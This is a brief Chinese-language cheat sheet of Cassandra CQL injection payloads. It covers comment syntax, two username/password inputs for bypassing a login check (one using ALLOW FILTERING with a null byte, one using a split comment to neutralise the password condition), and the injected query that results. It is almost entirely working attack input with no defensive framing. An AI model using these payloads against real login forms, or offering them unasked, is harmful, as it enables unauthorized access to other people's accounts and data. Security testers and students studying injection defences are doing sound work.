## 注释

```sql
/* Cassandra Comment */
```

## 登录绕过

```sql
1.
username: admin' ALLOW FILTERING; %00
password: ANY

2.
username: admin'/*
password: */and pass>'
```

## 注入

```sql
SELECT * FROM users WHERE user = 'admin'/*' AND pass = '*/and pass>'' ALLOW FILTERING;
```
